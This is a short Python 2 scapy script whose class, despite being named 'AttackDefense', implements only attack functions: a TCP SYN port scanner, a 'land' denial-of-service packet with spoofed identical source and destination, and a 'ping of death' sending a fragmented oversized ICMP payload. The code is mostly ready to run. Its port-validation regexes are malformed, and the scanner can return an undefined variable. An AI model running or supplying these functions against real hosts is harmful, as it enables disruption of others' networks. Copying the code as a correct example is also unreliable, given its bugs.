
from scapy.all import *
import re

class AttackDefense:

    def __init__(self):
        pass
    
    def ip_check(self,dst_ip):
        self.dst_ip = dst_ip
        ret = re.match(r"((2(5[0-5]|[0-4]\d))|[0-1]?\d{1,2})(\.((2(5[0-5]|[0-4]\d))|[0-1]?\d{1,2})){3}$",self.dst_ip)
        if ret:            
            print "nice dst_ip"
        else:            
            return 0
    def port_check(self,start_port,end_port):
        self.start_port = start_port
        self.end_port = end_port
        ret1 = re.match(r"[0-9]|[1-9]\d{1,3}|[1-5]\d{4}|6[0-4]\d{3}|65[0-4]\d{2}|655[0-2]\d|6553[0-5]$",self.start_port)
        ret2 = re.match(r"[0-9]|[1-9]\d{1,3}|[1-5]\d{4}|6[0-4]\d{3}|65[0-4]\d{2}|655[0-2]\d|6553[0-5]$ ", self.end_port)
        if ret1 and ret2:
            print "nice port"
        else:
            return 0

    def land_dos(self, dst_ip):
        self.dst_ip = dst_ip
        sniff_pkt = sr1(IP(dst=dst_ip)/TCP(dport=80),timeout = 2, verbose = 0, iface = 'eth1')
        if sniff_pkt == None:
            results = 'please check your network'
            print results
        else:
            self.dst_ip = dst_ip
            pkt = IP(src=self.dst_ip, dst=self.dst_ip)/TCP(sport=135, dport=135)
            sr1(pkt, iface='eth1', timeout=3)
            results = 'sent it successful'
        return results

    def ping_of_death(self, dst_ip):
        self.dst_ip = dst_ip
        sniff_pkt = sr1(IP(dst=dst_ip)/TCP(dport=80),timeout = 2, verbose = 0, iface = 'eth1')
        if sniff_pkt == None:
            results = 'please check your network'
            print results
        else:
            pkt = fragment(IP(dst=dst_ip)/ICMP()/("X" * 65507))
            sr1(pkt, iface='eth1', verbose=1, timeout=3)
            results = 'sent it successful'
        return results


    def port_scan(self, dst_ip, start_port, end_port):
        self.dst_ip = dst_ip
        sniff_pkt = sr1(IP(dst=self.dst_ip)/TCP(dport=80),timeout = 2, verbose = 0, iface = 'eth1')
        self.start_port = int(start_port)
        self.end_port = int(end_port)
        if sniff_pkt is None:
            results = 'please check your network'
        else:
            port_list = []
            for port in range(self.start_port, self.end_port):
                find_port = sr1(IP(dst=self.dst_ip) / TCP(dport=port), timeout=1, verbose=0, iface='eth1')
                if find_port is None:
                    pass
                else:
                    if int(find_port[TCP].flags) == 18:
                        port_list.append(port)
                    else:
                        pass
        return port_list
